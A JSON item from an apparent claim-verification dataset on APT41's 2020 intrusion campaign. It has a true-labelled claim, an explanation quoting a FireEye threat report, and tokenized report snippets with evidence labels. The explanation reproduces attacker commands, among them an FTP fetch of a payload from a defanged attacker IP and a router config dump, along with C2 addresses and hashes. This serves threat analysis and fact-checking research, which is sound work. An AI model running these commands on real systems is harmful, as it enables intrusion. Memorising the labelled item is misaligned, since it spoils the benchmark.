{
    "event_id": "014",
    "claim": "Chinese cyber espionage group APT41 initiated a global intrusion campaign by exploiting vulnerabilities in multiple high-value networks.",
    "original_label": "true",
    "label": "true",
    "explain": "Beginning this year, FireEye observed Chinese actor APT41 carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEye customers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA. The following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government, Healthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas, Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It’s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature.Starting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery Controller (ADC) and Citrix Gateway devices with CVE-2019-19781 (published December 17, 2019).The initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command ‘file /bin/pwd’, which may have achieved two objectives for APT41. First, it would confirm whether the system was vulnerable and the mitigation wasn’t applied. Second, it may return architecture-related information that would be required knowledge for APT41 to successfully deploy a backdoor in a follow-up step. One interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41 was operating with an already-known list of identified devices accessible on the internet.There is a lull in APT41 activity between January 23 and February 1, which is likely related to the Chinese Lunar New Year holidays which occurred between January 24 and January 30, 2020. This has been a common activity pattern by Chinese APT groups in past years as well. Starting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]/@66.42.98[.]220/bsd’, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of ‘test’ and a password that we have redacted, and then downloaded an unknown payload named ‘bsd’ (which was likely a backdoor). We did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated COVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out quarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019- 19781 exploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1, where only the name of the payload ‘un’ changed. Citrix released a mitigation for CVE-2019-19781 on December 17, 2019, and as of January 24, 2020, released permanent fixes for all supported versions of Citrix ADC, Gateway, and SD-WAN WANOP.On February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64- bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module that combines two CVE’s (CVE-2019-1653 and CVE-2019-1652) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload.66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5: c0c467c8e9b2046d7053642cc9bdd57d) is ‘cat /etc/flash/etc/nk_sysconfig’, which is the command one would execute on a Cisco RV320 router to display the current configuration. Cisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action: On March 5, 2020, researcher Steven Seeley, published an advisory and released proof-of-concept code for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (CVE-2020-10189). Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll. Here we see a toolmark from the tool ysoserial that was used to create the payload in the POC. The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation. In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.In both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON loader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).Storesyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile. Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we’ve observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.The Meterpreter downloader ‘TzGG’ was configured to communicate with 91.208.184[.]78 over port 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).The downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. We believe this is an example of the actor attempting to diversify post-exploitation access to the compromised systems. ManageEngine released a short term mitigation for CVE-2020-10189 on January 20, 2020, and subsequently released an update on March 7, 2020, with a long term fix.This activity is one of the most widespread campaigns we have seen from China-nexus espionage actors in recent years. While APT41 has previously conducted activity with an extensive initial entry such as the trojanizing of NetSarang software, this scanning and exploitation has focused on a subset of our customers, and seems to reveal a high operational tempo and wide collection requirements for APT41. It is notable that we have only seen these exploitation attempts leverage publicly available malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in previous incidents APT41 has waited to deploy more advanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage. Previously, FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a unique state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain.\n\n\n",
    "reports": [
        {
            "link": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/shadowpad-new-activity-from-the-winnti-group/",
            "content": "According to our information, the group has already compromised over 50 computers, and some of those may serve as a staging ground for subsequent, more serious attacks. More than half of the servers are concentrated on the IP addresses of six providers, five of which are in Asia (Hong Kong, China, and South Korea).In 2017, Proofpoint issued a report about attacks against targets in Russia and Belarus using ZeroT and PlugX.10. That domain was used for attacks targeting the CIS and Europe. The domain names give reason to suspect that attacks also target South Korea, Mongolia, Russia, and the United States. The second is a talk by FireEye researchers at Code Blue 2019 about cyberattacks against Japanese targets.8. These attacks have been described by Proofpoint researchers.11 It is also possible that the infrastructure was used by some other group to disguise its activities.",
            "domain": "www.ptsecurity.com",
            "tokenized": [
                {
                    "sent": "According to our information, the group has already compromised over 50 computers, and some of those may serve as a staging ground for subsequent, more serious attacks.",
                    "is_evidence": 0,
                    "is_repeat": 0
                },
                {
                    "sent": "More than half of the servers are concentrated on the IP addresses of six providers, five of which are in Asia (Hong Kong, China, and South Korea).In 2017, Proofpoint issued a report about attacks against targets in Russia and Belarus using ZeroT and PlugX.10",
                    "is_evidence": 0
                },
                {
                    "sent": "That domain was used for attacks targeting the CIS and Europe.",
                    "is_evidence": 0
                },
                {
                    "sent": "The domain names give reason to suspect that attacks also target South Korea, Mongolia, Russia, and the United States.",
                    "is_evidence": 0
                },
                {
                    "sent": "The second is a talk by FireEye researchers at Code Blue 2019 about cyberattacks against Japanese targets.8",
                    "is_evidence": 0
                },
                {
                    "sent": "These attacks have been described by Proofpoint researchers.11 It is also possible that the infrastructure was used by some other group to disguise its activities.",
                    "is_evidence": 0
                }
            ]
        },
        {
            "link": "https://www.recordedfuture.com/blog/redecho-targeting-indian-power-sector/",
            "content": "At least 3 of the targeted Indian IP addresses were previously seen in a suspected APT41/Barium-linked campaign targeting the Indian Oil and Gas sectors in November.2020 An even larger proportion of the RedEcho-targeted Indian IP addresses were observed communicating with 2 AXIOMATICASYMPTOTE servers hosting a large number of DDNS domains (91.204.224[.]14 and 91.204.225[.]216). In September 2020, 5 Chinese APT41 operators were indicted by the United States (US) government and linked to the front company Chengdu 404 Network Technology. Network access to Regional Load Despatch Centres provide minimal benefit for economic espionage objectives, but are of strategic interest to enable access pre-positioning for a variety of potential outcomes such as:As bilateral tensions continue to rise, we expect to see a continued increase in cyber operations being conducted by China-linked groups such as RedEcho in line with national strategic interests. Since early 2020, Recorded Future’s Insikt Group observed a large increase in suspected targeted intrusion activity against Indian organizations from Chinese state\u0002sponsored groups. The targeting of these critical power assets offer limited economic espionage opportunities, but pose significant concerns over potential pre-positioning of network access to support other Chinese strategic objectives. Throughout the remainder of 2020, we identified a heavy focus on the targeting of Indian government and private sector organizations by multiple Chinese state\u0002sponsored threat activity groups.",
            "domain": "www.recordedfuture.com",
            "tokenized": [
                {
                    "sent": "At least 3 of the targeted Indian IP addresses were previously seen in a suspected APT41/Barium-linked campaign targeting the Indian Oil and Gas sectors in November.2020 An even larger proportion of the RedEcho-targeted Indian IP addresses were observed communicating with 2 AXIOMATICASYMPTOTE servers hosting a large number of DDNS domains (91.204.224[.]14 and 91.204.225[.]216).",
                    "is_evidence": 0,
                    "is_repeat": 0
                },
                {
                    "sent": "In September 2020, 5 Chinese APT41 operators were indicted by the United States (US) government and linked to the front company Chengdu 404 Network Technology.",
                    "is_evidence": 0
                },
                {
                    "sent": "Network access to Regional Load Despatch Centres provide minimal benefit for economic espionage objectives, but are of strategic interest to enable access pre-positioning for a variety of potential outcomes such as:As bilateral tensions continue to rise, we expect to see a continued increase in cyber operations being conducted by China-linked groups such as RedEcho in line with national strategic interests.",
                    "is_evidence": 0,
                    "is_repeat": 0
                },
                {
                    "sent": "Since early 2020, Recorded Future’s Insikt Group observed a large increase in suspected targeted intrusion activity against Indian organizations from Chinese state\u0002sponsored groups.",
                    "is_evidence": 0,
                    "is_repeat": 0
                },
                {
                    "sent": "The targeting of these critical power assets offer limited economic espionage opportunities, but pose significant concerns over potential pre-positioning of network access to support other Chinese strategic objectives.",
                    "is_evidence": 0,
                    "is_repeat": 0
                },
                {
                    "sent": "Throughout the remainder of 2020, we identified a heavy focus on the targeting of Indian government and private sector organizations by multiple Chinese state\u0002sponsored threat activity groups.",
                    "is_evidence": 0,
                    "is_repeat": 0
                }
            ]
        },
        {
            "link": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/",
            "content": "According to Unit42, the main targets of Paranoid PlugX attacks were gaming companies—which are known to be a typical area of interest for Winnti. But detailed analysis pointed to the Winnti group (also known as APT41, per FireEye) of Chinese origin. But when we accessed it for the first time, it had the IP address 107.174.45[.]134, which is related to the domain dc-d68d34331440.mircosoftbox[.]com and, apparently, had been put in place by the attackers. In this article, we will share the results of our investigation of these samples and related network infrastructure, as well as overlaps with previously described attacks. Such attacks continue today, and Russian companies are also among their targets. We can confidently state that some of these attacks were directed at a number of organizations in Russia and Hong Kong.",
            "domain": "www.ptsecurity.com",
            "tokenized": [
                {
                    "sent": "According to Unit42, the main targets of Paranoid PlugX attacks were gaming companies—which are known to be a typical area of interest for Winnti.",
                    "is_evidence": 0,
                    "is_repeat": 0
                },
                {
                    "sent": "But detailed analysis pointed to the Winnti group (also known as APT41, per FireEye) of Chinese origin.",
                    "is_evidence": 0
                },
                {
                    "sent": "But when we accessed it for the first time, it had the IP address 107.174.45[.]134, which is related to the domain dcd68d34331440.mircosoftbox[.]com and, apparently, had been put in place by the attackers.",
                    "is_evidence": 0
                },
                {
                    "sent": "In this article, we will share the results of our investigation of these samples and related network infrastructure, as well as overlaps with previously described attacks.",
                    "is_evidence": 0
                },
                {
                    "sent": "Such attacks continue today, and Russian companies are also among their targets.",
                    "is_evidence": 0,
                    "is_repeat": 0
                },
                {
                    "sent": "We can confidently state that some of these attacks were directed at a number of organizations in Russia and Hong Kong.",
                    "is_evidence": 0
                }
            ]
        },
        {
            "link": "https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/",
            "content": "In another case, the game servers were compromised, which could have allowed the attackers to, for example, manipulate in-game currencies for financial gain. In at least one case, the attackers were able to compromise the company’s build orchestration server, allowing them to take control of the automated build systems. In at least one case, the malware operators compromised a victim’s build system, which could have led to a supply-chain attack, allowing the attackers to trojanize game executables. Recently, ESET researchers also discovered a campaign of the Winnti Group targeting several Hong Kong universities with ShadowPad and Winnti malware. The Winnti Group, active since at least 2012, is responsible for high-profile supply-chain attacks against the software industry, leading to the distribution of trojanized software (such as CCleaner, ASUS LiveUpdate and multiple video games) that is then used to compromise more victims. We found on a sample sharing platform other tools signed with this certificate, such as HTRan, a connection bouncer, the WinEggDrop port scanner, Netcat, and Mimikatz which may have been used by the attackers as well.",
            "domain": "www.welivesecurity.com",
            "tokenized": [
                {
                    "sent": "In another case, the game servers were compromised, which could have allowed the attackers to, for example, manipulate in-game currencies for financial gain.",
                    "is_evidence": 0,
                    "is_repeat": 0
                },
                {
                    "sent": "In at least one case, the attackers were able to compromise the company’s build orchestration server, allowing them to take control of the automated build systems.",
                    "is_evidence": 0
                },
                {
                    "sent": "In at least one case, the malware operators compromised a victim’s build system, which could have led to a supply-chain attack, allowing the attackers to trojanize game executables.",
                    "is_evidence": 0
                },
                {
                    "sent": "Recently, ESET researchers also discovered a campaign of the Winnti Group targeting several Hong Kong universities with ShadowPad and Winnti malware.",
                    "is_evidence": 0
                },
                {
                    "sent": "The Winnti Group, active since at least 2012, is responsible for high-profile supply-chain attacks against the software industry, leading to the distribution of trojanized software (such as CCleaner, ASUS LiveUpdate and multiple video games) that is then used to compromise more victims.",
                    "is_evidence": 0
                },
                {
                    "sent": "We found on a sample sharing platform other tools signed with this certificate, such as HTRan, a connection bouncer, the WinEggDrop port scanner, Netcat, and Mimikatz which may have been used by the attackers as well.",
                    "is_evidence": 0
                }
            ]
        }
    ]
}